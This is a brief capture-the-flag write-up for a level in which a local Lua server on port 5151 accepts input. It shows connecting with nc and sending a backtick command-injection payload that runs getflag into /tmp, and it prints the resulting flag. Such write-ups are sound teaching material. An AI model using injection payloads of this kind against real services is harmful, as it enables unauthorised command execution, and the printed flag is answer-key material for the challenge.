# LEVEL11

The code is in ```lua```. We can see that it uses the port ```5151```

```nc 127.0.0.1 5151```

The server will ask for an input.
We'll exploit the input by giving : 
``` `getflag > /tmp/flag11` ```

This line is executed and we can ```cat /tmp/flag11``` , from it we get ```fa6v5ateaw21peobuub8ipe6s```
